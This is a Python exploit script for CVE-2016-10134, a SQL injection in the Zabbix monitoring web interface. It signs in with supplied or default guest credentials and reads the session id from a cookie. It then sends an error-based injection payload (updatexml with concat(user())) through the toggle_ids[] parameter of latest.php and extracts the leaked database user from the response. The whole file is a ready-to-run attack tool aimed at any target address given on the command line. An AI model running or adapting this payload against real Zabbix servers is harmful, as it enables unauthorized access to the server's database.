# -*- coding: utf-8 -*-
# @Time    : 2021/12/23
# @Author  : TesterCC

import json
import traceback
from optparse import OptionParser

import re
import sys

from requests import session

# initialization
ret = dict()
ret['status'] = str()
ret['info'] = list()

ss = session()
ss.headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}


# CVE-2016-10134

def get_payload1(text) -> str:
    payload = re.search(r"\[(.*\))\]", text)
    return payload.group(1)


def get_sql_injection_info(text) -> str:
    sql_injection_info = re.search(r"<\/li><li>(.*)\'\]", text)
    return sql_injection_info.group(1)


def attack_with_login(username, password, target):
    '''login zabbix'''
    login_url = "http://{}/index.php".format(target)

    ret0 = ss.get(login_url)

    cookie_dict = {i.name: i.value for i in ret0.cookies}
    # get sid
    sid = cookie_dict.get('zbx_sessionid')[16:]
    # print(f"cookie sid: {sid}")

    data = {"sid": sid,
            "form_refresh": "1",
            "name": username,
            "password": password,
            "enter": "Sign+in"}

    retn = ss.post(url=login_url, headers=ss.headers, data=data)
    if retn.status_code == 200:

        payload1 = f"http://{target}/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)"
        retn2 = ss.get(url=payload1, headers=ss.headers)

        if retn2.status_code == 200:
            resp = {
                "payload": get_payload1(retn2.text),
                "info": get_sql_injection_info(retn2.text)
            }
            # print(resp)
            ret['status'] = 'success'
            ret['info'] = resp

    return ret


def main():
    usage = "Usage: %prog --target <target ip> --user <user name> --pw <password>"
    parse = OptionParser(usage=usage)
    parse.add_option("-t", '--target', type="string", dest="target", help="server ip:port, e.g. 127.0.0.1:8080")
    parse.add_option("-u", '--user', type="string", dest="username", default="guest", help="login username")
    parse.add_option("-p", '--pw', type="string", dest="password", default="", help="login password")

    options, args = parse.parse_args()

    username = ""
    password = ""

    if not options.target:
        ret['status'] = 'fail'
        ret['info'] = "target empty"
        sys.exit()
    else:
        target = options.target

    if options.username:
        username = options.username

    if options.password:
        password = options.password
    print(options.target,options.username,options.password)
    try:
        attack_with_login(username, password, target)
    except Exception:
        ret['status'] = 'fail'
        traceback.print_exc()

    print(json.dumps(ret))

if __name__ == '__main__':
    main()
